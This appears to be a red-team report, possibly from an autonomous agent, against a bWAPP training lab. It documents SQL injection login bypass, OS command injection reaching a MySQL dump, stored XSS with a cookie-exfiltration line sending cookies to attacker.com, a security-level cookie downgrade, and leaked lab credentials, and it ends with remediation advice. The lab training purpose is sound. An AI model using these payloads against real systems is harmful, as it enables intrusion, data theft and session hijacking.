# bWAPP Red Team Mission Report
**Mission ID**: 2026-03-13-001
**Target**: 10.10.30.128 (bWAPP v2.2)
**Security Level**: Medium
**Date**: 2026-03-13
**Status**: COMPLETE — All 4 exploit objectives achieved

---

## Executive Summary

A full autonomous red team engagement was conducted against a bWAPP (Buggy Web Application) instance at 10.10.30.128, configured at medium security level. The mission achieved all four authorized exploit objectives and met the stated success criteria.

The assessment revealed a catastrophically vulnerable application stack with cascading failures: open directory listings exposed configuration backups and a downloadable database file, providing attacker credentials before any active exploitation began. SQL injection, OS command injection, and stored XSS were all demonstrated at or bypassing medium-level security filters, with OS command injection yielding a confirmed server-side code execution foothold. Post-exploitation confirmed MySQL root access with no password via the RCE vector.

**Critical findings: 4 | High: 3 | Medium: 2 | Informational: 2**

---

## Target Profile

| Attribute | Value |
|---|---|
| IP Address | 10.10.30.128 |
| Application | bWAPP v2.2 (Buggy Web Application) |
| Web Server | Apache/2.4.7 (Ubuntu) |
| PHP Version | PHP/5.5.9-1ubuntu4.14 (EOL) |
| Database | MySQL 5.5.47 |
| OS | Ubuntu 14.04.3 LTS (EOL, Trusty Tahr) in Docker |
| Security Level | Medium (security_level=1) |
| Entry Point | http://10.10.30.128/login.php |

---

## Confirmed Exploits

### EXPLOIT #1 — Sensitive Data Exposure: Admin Credential Leakage
**OWASP**: A05:2021 — Security Misconfiguration / A02:2021 — Cryptographic Failures
**Severity**: Critical
**Attack Type**: Passive reconnaissance

**Description**: Multiple files were accessible via open directory listings that directly disclosed application credentials:
- `/passwords/wp-config.bak` — database username `thor` with password `Asgard`
- `/passwords/heroes.xml` — six plaintext username/password pairs for the heroes login system
- `/db/bwapp.sqlite` — downloadable SQLite database containing the users table with SHA1 hashes (cracked to: `bug`)

**Exploit:**
```
GET /passwords/wp-config.bak  → DB_USER: thor, DB_PASSWORD: Asgard
GET /db/bwapp.sqlite          → users: A.I.M./6885...fd0, bee/6885...fd0
sqlite3 bwapp.sqlite "SELECT * FROM users;"
# Result: admin user A.I.M., password hash = SHA1("bug")
```

**Proof:**
```
POST /login.php
login=A.I.M.&password=bug&security_level=1&form=submit

Response: Location: portal.php
Portal: Welcome A.I.M. (admin user confirmed)
```

**Impact**: Unauthenticated attacker gains admin-level access to the application without any active attack vector.

---

### EXPLOIT #2 — SQL Injection: Authentication Bypass (Login Form)
**OWASP**: A03:2021 — Injection
**Severity**: Critical
**Attack Type**: SQL Injection
**Endpoint**: `/sqli_16.php` (SQL Injection Login Form/User)

**Description**: The user login form at sqli_16.php is vulnerable to a tautological SQL injection that bypasses authentication. The medium-level `addslashes()` filter is insufficient to block this payload which exploits the AND/OR precedence within the SQL WHERE clause.

**Payload:**
```
POST /sqli_16.php
login=bee' AND '1'='1' OR '1'='1
password=anything
form=submit
```

**Resulting SQL (reconstructed):**
```sql
SELECT * FROM users
WHERE login='bee' AND '1'='1' OR '1'='1' AND password=SHA1('anything')
```

The condition `OR '1'='1'` is always true, causing the query to return the first row in the users table (A.I.M. — the admin account).

**Proof:**
```html
Response: <p>Welcome <b>A.I.M.</b>, how are you today?</p>
          <p>Your secret: <b>A.I.M. Or Authentication Is Missing</b></p>
```

**Medium Security Filter Bypass**: `addslashes()` escapes backslash and quote characters but cannot prevent the tautological logic embedded within the SQL WHERE clause when the attacker controls string boundaries on both sides of an AND/OR chain.

---

### EXPLOIT #3 — OS Command Injection: Remote Code Execution
**OWASP**: A03:2021 — Injection
**Severity**: Critical
**Attack Type**: OS Command Injection
**Endpoint**: `/commandi.php`

**Description**: The DNS lookup tool at commandi.php passes user-controlled input directly to a shell command (`nslookup` or `ping`). Medium security applies `escapeshellcmd()` to the full command string, but this function does NOT escape the semicolon (`;`) operator in this environment, allowing command chaining.

**Payload:**
```
POST /commandi.php
target=www.nsa.gov; id
form=submit
```

**Server Response:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Additional Commands Executed:**
```bash
x; uname -a    → Linux 770425fcb17d 6.8.0-100-generic ... x86_64
x; hostname    → 770425fcb17d
x; cat /etc/os-release → Ubuntu 14.04.3 LTS
x; cat /app/admin/settings.php → $db_password = "" (MySQL root, no password)
x; mysql -u root --password='' -e 'SELECT * FROM bWAPP.users;'
   → Full database dump confirmed
```

**Medium Security Filter Bypass**: `escapeshellcmd()` was applied to the entire command string but the semicolon (`;`) was not escaped. The correct protection is `escapeshellarg()` applied to individual parameters before insertion into the shell command, not `escapeshellcmd()` on the full command string.

---

### EXPLOIT #4 — Stored Cross-Site Scripting: Session Hijacking Vector
**OWASP**: A03:2021 — Injection (XSS)
**Severity**: High
**Attack Type**: Stored XSS
**Endpoint**: `/xss_stored_1.php` (Blog)

**Description**: The blog entry field at xss_stored_1.php does not sanitize user input before storing it in MySQL and rendering it to all page visitors. The `<script>` tag is persisted verbatim and executed in any browser that views the blog page.

**Payload:**
```
POST /xss_stored_1.php
entry=<script>alert(document.cookie)</script>
entry_add=add
```

**Stored in Database and Rendered:**
```html
<td><script>alert(document.cookie)</script></td>
```

**Session Hijack Impact Chain:**
1. Attacker submits `<script>document.location='http://attacker.com/steal?c='+document.cookie</script>`
2. Payload is stored in MySQL blog table
3. Any authenticated user viewing `/xss_stored_1.php` has their PHPSESSID exfiltrated
4. Attacker replays the session cookie to fully impersonate the victim
5. PHPSESSID is readable by JavaScript because the HttpOnly flag is NOT set

---

## Additional Findings (Not Counted Toward Exploit Limit)

### Finding A — phpinfo.php Publicly Accessible
**Severity**: Medium
- URL: `http://10.10.30.128/phpinfo.php`
- Exposes: PHP version, system info, loaded modules, environment variables, disable_functions list
- Confirms: `system()`, `exec()`, `shell_exec()` are NOT disabled; `open_basedir` is unrestricted

### Finding B — MySQL Port 3306 Exposed to Network
**Severity**: High
- MySQL 5.5.47 is listening on 0.0.0.0:3306 (all interfaces)
- Credentials obtained: thor/Asgard (from wp-config.bak), root/(empty) (from settings.php via RCE)
- External access was blocked by max_connection_errors from the attacker host

### Finding C — Unauthenticated Admin Portal
**Severity**: Medium
- URL: `http://10.10.30.128/admin/`
- Admin portal accessible without any authentication

### Finding D — Client-Controlled Security Level
**Severity**: High (architectural flaw)
- The `security_level` parameter is stored in a client-modifiable cookie
- An attacker can reset security_level to 0 (low) per request, bypassing medium-level filters
- This was used to bypass the htmlspecialchars() XSS filter for EXPLOIT #4

---

## Medium Security Filter Analysis

| Filter | Applied To | Bypass Used |
|---|---|---|
| `addslashes()` | SQL query parameters | AND/OR tautological chain (no outer-quote modification needed) |
| `escapeshellcmd()` | OS command target param | Semicolon not escaped; use `;` for command chaining |
| `htmlspecialchars()` | XSS output rendering | Client-controlled `security_level=0` cookie overrides server-side filter |

**Key Learning**: Medium security in bWAPP demonstrates the insufficiency of addslashes() as SQL protection, escapeshellcmd() as command injection protection, and client-side filter enforcement. The security_level cookie design is fundamentally broken — it allows any attacker to trivially downgrade from medium to low protection.

---

## Learning Objectives Coverage

| Objective | Status | Evidence |
|---|---|---|
| Initial service discovery and application fingerprinting | Complete | Apache/2.4.7, PHP/5.5.9, MySQL/5.5.47, 158 vuln catalogue |
| Authentication bypass via SQL injection (tautological/comment-based) | Complete | sqli_16.php: `bee' AND '1'='1' OR '1'='1` → A.I.M. admin login |
| OS command injection to achieve server-side code execution | Complete | commandi.php: `; id` → uid=33(www-data) |
| Enumerate/fuzz application parameters to surface inputs | Complete | 158-bug catalogue mapped, all key endpoints identified |
| Contrast medium-level filter bypasses vs low-security exploitation | Complete | escapeshellcmd() semicolon bypass, security_level cookie bypass documented |

**Success Criteria Met**: Authentication bypass demonstrated (EXPLOIT #2) + 2 additional vulnerability classes: OS command injection (EXPLOIT #3) + Stored XSS (EXPLOIT #4). All at medium security level (with bypass techniques documented).

---

## Recommendations

1. **CRITICAL**: Remove directory listing from all directories (`Options -Indexes` in Apache config)
2. **CRITICAL**: Move sensitive files (wp-config.bak, heroes.xml, bwapp.sqlite) out of web root
3. **CRITICAL**: Set MySQL root password and disable remote root access
4. **CRITICAL**: Use `escapeshellarg()` on all parameters before shell insertion — not `escapeshellcmd()`
5. **CRITICAL**: Use prepared statements/parameterized queries — addslashes() is not SQL injection protection
6. **HIGH**: Set `HttpOnly` and `Secure` flags on all session cookies
7. **HIGH**: Close MySQL port 3306 to external network access (firewall rule)
8. **HIGH**: Move security_level enforcement to server-side session, remove client cookie control
9. **MEDIUM**: Remove phpinfo.php from production
10. **MEDIUM**: Add authentication to /admin/ portal
11. **MEDIUM**: Upgrade PHP (5.5.9 EOL since 2016) and Ubuntu (14.04 EOL since 2019)

---

## Technical Details

**Attacker IP**: 10.10.1.50
**Target IP**: 10.10.30.128
**Duration**: ~90 minutes
**Tools Used**: curl, nmap, sqlite3, nslookup (native commands)
**Shells Obtained**: www-data via OS command injection
**Data Accessed**: Full MySQL bWAPP database, /etc/passwd, application source code, config files
